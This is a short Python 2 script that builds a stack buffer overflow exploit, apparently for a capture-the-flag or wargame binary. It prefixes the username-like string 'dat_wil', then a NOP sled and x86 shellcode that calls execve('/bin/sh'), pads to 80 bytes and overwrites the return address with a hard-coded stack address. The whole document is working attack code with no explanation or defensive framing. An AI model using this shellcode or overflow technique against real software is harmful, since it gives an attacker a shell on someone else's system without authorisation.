import struct

shellcode = 32*"\x90" + "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

exploit = "dat_wil\n"

exploit += shellcode

exploit += b'A'*(80 - len(shellcode))

exploit += struct.pack("I", 0xffffd6cc)

print exploit